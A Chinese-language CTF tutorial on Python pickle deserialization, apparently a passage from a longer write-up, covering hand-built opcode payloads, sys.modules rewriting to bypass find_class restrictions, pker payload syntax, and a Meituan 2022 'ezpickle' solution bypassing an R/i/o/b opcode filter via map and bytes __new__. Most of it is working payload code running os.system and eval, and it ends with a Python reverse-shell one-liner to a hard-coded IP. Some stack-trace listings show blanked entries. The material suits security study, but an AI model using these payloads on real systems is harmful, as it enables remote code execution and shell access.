c=b'\x80\x03(cbuiltins\ngetattr\np0\ncbuiltins\ndict\np1\nX\x03\x00\x00\x00getop2\n0(g2\n(cbuiltins\nglobals\noX\x0C\x00\x00\x00__builtins__op3\n(g0\ng3\nX\x04\x00\x00\x00evalop4\n(g4\nX\x21\x00\x00\x00__import__("os").system("whoami")o00.'#最后两个0是栈为空，否则会报错
```

### 绕过域名空间限制

重写sys.modules

之前说过find\_class使用`sys.modules[module],name)`来引入模块，但是sys自身也在sys.modules中，所以通过s操作符使sys.modules\['sys'\]=sys.modules，sys模块也就变成了sys.modules模块，然后引入sys.modules中的get方法，取得sys.modules字典中的os模块，再使用s操作符使sys.modules\['sys'\]=os，当前sys模块就变成了os模块，最后成功执行os.system("whoami")。

```python
R操作码
payload=b'csys\nmodules\np0\nX\x03\x00\x00\x00sysg0\nscsys\nget\np1\ng1\nX\x02\x00\x00\x00os\x85Rp2\ng0\nX\x03\x00\x00\x00sysg2\nscsys\nsystem\nX\x06\x00\x00\x00whoami\x85R.'
o操作码
payload=b'csys\nmodules\np0\nX\x03\x00\x00\x00sysg0\ns(csys\nget\np1\nX\x02\x00\x00\x00osop2\ng0\nX\x03\x00\x00\x00sysg2\ns(csys\nsystem\nX\x06\x00\x00\x00whoamio.'
```

0x04 自动化编写 pickle opcode
========================

使用工具pker

pker的作用：

&gt; - 变量赋值：存到memo中，保存memo下标和变量名即可  
&gt; - 函数调用  
&gt; - 类型字面量构造  
&gt; - list和dict成员修改  
&gt; - 对象成员变量修改

具体来讲，可以使用pker进行**原变量覆盖、函数执行、实例化新的对象**。

0x05 pickle opcode使用方法与示例
=========================

1. pker中的针对pickle的特殊语法需要重点掌握（后文给出示例）
2. 此外我们需要注意一点：python中的所有类、模块、包、属性等都是对象，这样便于对各操作进行理解。
3. pker主要用到`GLOBAL、INST、OBJ`三种特殊的函数以及一些必要的转换方式，其他的opcode也可以手动使用：

```python
以下module都可以是包含`.`的子module
调用函数时，注意传入的参数类型要和示例一致
对应的opcode会被生成，但并不与pker代码相互等价

GLOBAL
对应opcode：b'c'
获取module下的一个全局对象（没有import的也可以，比如下面的os）：
GLOBAL('os', 'system')
输入：module,instance(callable、module都是instance)  

INST
对应opcode：b'i'
建立并入栈一个对象（可以执行一个函数）：
INST('os', 'system', 'ls')  
输入：module,callable,para 

OBJ
对应opcode：b'o'
建立并入栈一个对象（传入的第一个参数为callable，可以执行一个函数））：
OBJ(GLOBAL('os', 'system'), 'ls') 
输入：callable,para

xxx(xx,...)
对应opcode：b'R'
使用参数xx调用函数xxx（先将函数入栈，再将参数入栈并调用）

li[0]=321
或
globals_dic['local_var']='hello'
对应opcode：b's'
更新列表或字典的某项的值

xx.attr=123
对应opcode：b'b'
对xx对象进行属性设置

return
对应opcode：b'0'
出栈（作为pickle.loads函数的返回值）：
return xxx # 注意，一次只能返回一个对象或不返回对象（就算用逗号隔开，最后也只返回一个元组）
```

注意：

1. 由于opcode本身的功能问题，pker肯定也不支持列表索引、字典索引、点号取对象属性作为**左值**，需要索引时只能先获取相应的函数（如`getattr`、`dict.get`）才能进行。但是因为存在`s`、`u`、`b`操作符，**作为右值是可以的**。即“查值不行，赋值可以”。
2. pker解析`S`时，用单引号包裹字符串。所以pker代码中的双引号会被解析为单引号opcode:

```php
test="123"
return test
```

被解析为：

```php
b"S'123'\np0\n0g0\n."
```

### pker：全局变量覆盖

- 覆盖直接由执行文件引入的`secret`模块中的`name`与`category`变量：

```php
secret=GLOBAL('__main__', 'secret') 
# python的执行文件被解析为__main__对象，secret在该对象从属下
secret.name='1'
secret.category='2'
```

- 覆盖引入模块的变量：

```php
game = GLOBAL('guess_game', 'game')
game.curr_ticket = '123'
```

接下来会给出一些具体的基本操作的实例。

#### pker：函数执行

- 通过`b'R'`调用：

```python
s='whoami'
system = GLOBAL('os', 'system')
system(s) # `b'R'`调用
return
```

- 通过`b'i'`调用：

```python
INST('os', 'system', 'whoami')
```

- 通过`b'c'`与`b'o'`调用：

```python
OBJ(GLOBAL('os', 'system'), 'whoami')
```

- 多参数调用函数

```python
INST('[module]', '[callable]'[, par0,par1...])
OBJ(GLOBAL('[module]', '[callable]')[, par0,par1...])
```

#### pker：实例化对象

- 实例化对象是一种特殊的函数执行

```python
animal = INST('__main__', 'Animal','1','2')
return animal
# 或者
animal = OBJ(GLOBAL('__main__', 'Animal'), '1','2')
return animal
```

- 其中，python原文件中包含：

```python
class Animal:

    def __init__(self, name, category):
        self.name = name
        self.category = category
```

- 也可以先实例化再赋值：

```python
animal = INST('__main__', 'Animal')
animal.name='1'
animal.category='2'
return animal
```

#### 手动辅助

- 拼接opcode：将第一个pickle流结尾表示结束的`.`去掉，两者拼接起来即可。
- 建立普通的类时，可以先pickle.dumps，再拼接至payload。

0x06 实战
=======

**美团2022 ezpickle**

```python
@app.route('/admin')
def admin():
    if session.get('user') != "admin":
        return f""
    else:
        try:
            a = base64.b64decode(session.get('ser_data')).replace(b"builtin", b"BuIltIn").replace(b"os", b"Os").replace(b"bytes", b"Bytes")
            if b'R' in a or b'i' in a or b'o' in a or b'b' in a:
                raise pickle.UnpicklingError("R i o b is forbidden")
            pickle.loads(base64.b64decode(session.get('ser_data')))
            return "ok"
        except:
            return "error!"
```

题目过滤了 Riob 这四个字母

考虑使用

```python
import os
bytes.__new__(bytes,map.__new__(map,eval,['print(11111)']))
#11111
bytes.__new__(bytes,map.__new__(map,os.system,['whoami']))
bytes.__new__(bytes,map.__new__(map,os.system,('whoami',)) #map的第二个参数只要是可迭代对象就可以了
#laptop-j0acdp41\jackbin
```

**原理：python内置函数**

`map`(*function*, *iterable*, *...*)

返回一个**将 *function* 应用于 *iterable* 中每一项并输出其结果的迭代器**。 如果传入了额外的 *iterable* 参数，*function* 必须接受相同个数的实参并被应用于从所有可迭代对象中并行获取的项。 当有多个可迭代对象时，最短的可迭代对象耗尽则整个迭代就将结束。

*class* `bytes`(\[*source*\[, *encoding*\[, *errors*\]\]\])

返回一个新的“bytes”对象， 是一个不可变序列，包含范围为 `0 &lt;= x &lt; 256` 的整数。[`bytes`](stdtypes.html#bytes) 是 [`bytearray`](stdtypes.html#bytearray) 的不可变版本 - 它有其中不改变序列的方法和相同的索引、切片操作。

`cls.__new__(cls,arg*)`等价于 `cls(arg*)`

构造的payload

```python
#bytes.__new__(bytes,map.__new__(map,os.system,['whoami']))
#或者
#bytes.__new__(bytes,map.__new__(map,os.system,('whoami',)))
#或者
#bytes.__new__(bytes,map.__new__(map,os.system,{'whoami',}))
#laptop-j0acdp41\jackbin
payload=b'''c__builtin__
map
p0
0(S'whoami'
tp1
0(cos
system
g1
tp2
0g0
g2
\x81p3
0c__builtin__
bytes
p4
(g3
t\x81.'''

payload=b'''cbuiltins
map
p0
0(S'whoami'
tp1
0(cos
system
g1
tp2
0g0
g2
\x81p3
0cbuiltins
bytes
p4
(g3
t\x81.'''
```

分析:

**第1步`c`**

```python
    def load_global(self):
        module = self.readline()[:-1].decode("utf-8") #__builtin__ 或者 builtins
        name = self.readline()[:-1].decode("utf-8") #map
        klass = self.find_class(module, name) #获取builtins模块下的map类 
        self.append(klass)  #将压入自身栈中
    dispatch[GLOBAL[0]] = load_global
```

自身栈：

```python
stack:[]
```

**第2步`p0`**

将``放入记忆栈0位置中

记忆栈：

```python
memo:[]
```

**第3步`0`**

去掉自身栈中的栈顶元素

自身栈：

```python
空
```

**第4步`(`**

向栈(self.stack)中插入一个merk标记

```python
    def load_mark(self):
        self.metastack.append(self.stack) #将当前的栈整个记录到 metastack #空栈
        self.stack = [] #然后将栈置空
        self.append = self.stack.append
    dispatch[MARK[0]] = load_mark
```

**第5步`S'whoami'`**

读取字符串将字符串压入栈中

自身栈：

```python
stack:['whoami']
```

**第6步`t`**

寻找栈中的上一个MARK，**并组合之间的数据为元组**，恢复MARK标志之前的栈，并且加到MARK之前的栈

```python
    def load_tuple(self):
        items = self.pop_mark() #当前自身栈
        self.append(tuple(items)) #用当前栈中的内容生成tuple，并且加到MARK之前的栈
    dispatch[TUPLE[0]] = load_tuple
```

pop\_mark()

```python
    # Return a list of items pushed in the stack after last MARK instruction.
    # 把自身栈 变回 上一次MARK之前的栈
    def pop_mark(self):
        items = self.stack
        self.stack = self.metastack.pop() # 把自身栈 变回 上一次MARK之前的栈
        self.append = self.stack.append
        return items #返回调用时的自身栈
```

自身栈：

```python
stack:[('whoami',)]
```

**第7步`p1`**

将`('whoami',)`放入记忆栈1位置中

记忆栈：

```python
memo:[,('whoami',)]
```

**第8步`0`**

去掉自身栈中的栈顶元素

自身栈：

```python
stack:[]
```

**第9步`(`**

向栈(self.stack)中插入一个merk标记

记录栈：

```python
stack:[]
```

**第10步`c`**

```python
    def load_global(self):
        module = self.readline()[:-1].decode("utf-8") #os
        name = self.readline()[:-1].decode("utf-8") #system
        klass = self.find_class(module, name) #获取os模块下的system类 
        self.append(klass)  #将压入自身栈中
    dispatch[GLOBAL[0]] = load_global
```

自身栈：

```python
stack:[]
```

**第11步`g1`**

将memo中的下标为1个数据，放入栈中

自身栈：

```python
stack:[,('whoami',)]
```

**第12步`t`**

寻找栈中的上一个MARK，**并组合之间的数据为元组**，恢复MARK标志之前的栈，并且加到MARK之前的栈

```python
    def load_tuple(self):
        items = self.pop_mark() #恢复当前自身栈为MARK标志之前的栈
        self.append(tuple(items)) #用当前栈中的内容生成tuple，并且加到MARK之前的栈
    dispatch[TUPLE[0]] = load_tuple
```

自身栈：

```python
stack:[(,('whoami',),)]
```

**第13步`p2`**

将`(,,)`放入记忆栈2位置中

记忆栈：

```python
memo:[,('whoami',),(,('whoami',),)]
```

**第14步`0`**

去掉自身栈中的栈顶元素

自身栈：

```python
stack:[]
```

**第15步 `g0`,`g2`**

将memo中的下标为0,2个数据，放入栈中

自身栈：

```python
stack:[,(,('whoami',),)]
```

**第16步 `\x81`**

```python
    def load_newobj(self):
        args = self.stack.pop() #(,('whoami',),)
        cls = self.stack.pop() #
        obj = cls.__new__(cls, *args) #map.__new__(map,(,('whoami',),)) 将和('whoami',)作为参数，生成了map对象 
        self.append(obj)
    dispatch[NEWOBJ[0]] = load_newobj
```

自身栈：

```python
stack:[]
```

**第17步`p3`**

将``放入记忆栈2位置中

记忆栈：

```python
memo:[,('whoami',),(,('whoami',),),]

```

**第18步`0`**

去掉自身栈中的栈顶元素

自身栈：

```python
stack:[]

```

**第19步`c`:**

```python
    def load_global(self):
        module = self.readline()[:-1].decode("utf-8") #__builtin__ 或者 builtins
        name = self.readline()[:-1].decode("utf-8") #bytes
        klass = self.find_class(module, name) #获取builtins模块下的bytes类 
        self.append(klass)  #将压入自身栈中
    dispatch[GLOBAL[0]] = load_global

```

自身栈：

```python
stack:[]

```

**第20步`p4`**

将``放入记忆栈2位置中

记忆栈：

```python
memo:[,('whoami',),(,('whoami',),),,]

```

**第21步`(`**

向栈(self.stack)中插入一个merk标记，并将当前栈暂时置空，遇到pop\_mark函数，就会恢复

记录栈：

```python
stack:[]

```

自身栈：

```python
stack:[]

```

**第22步`g3`**

将memo中的下标为3个数据，放入栈中

自身栈：

```python
stack:[]

```

**第23步`t`**

寻找栈中的上一个MARK，**并组合之间的数据为元组**，恢复MARK标志之前的栈，并且加到MARK之前的栈

```python
    def load_tuple(self):
        items = self.pop_mark() #恢复当前自身栈为MARK标志之前的栈
        self.append(tuple(items)) #用当前栈中的内容生成tuple，并且加到MARK之前的栈
    dispatch[TUPLE[0]] = load_tuple

```

自身栈：

```python
stack:[,(,)]

```

**第24步 `\x81` 实现命令执行函数调用**

**传入的arg必须是一个tuple**

```python
    def load_newobj(self):
        args = self.stack.pop() #(,)
        cls = self.stack.pop() #
        obj = cls.__new__(cls, *args) #bytes.__new__(bytes,(,)) 将(,)作为参数，生成了bytes对象 
        #相当于 bytes.__new__(bytes,map.__new__(map,os.system,('whoami',)))
        ##实现命令执行
        self.append(obj)
    dispatch[NEWOBJ[0]] = load_newobj

```

**第25步`.`结束**

一般pickle使用的反弹shell方法都是使用python

```python

import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.244.133",2333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);

```</i></i>
```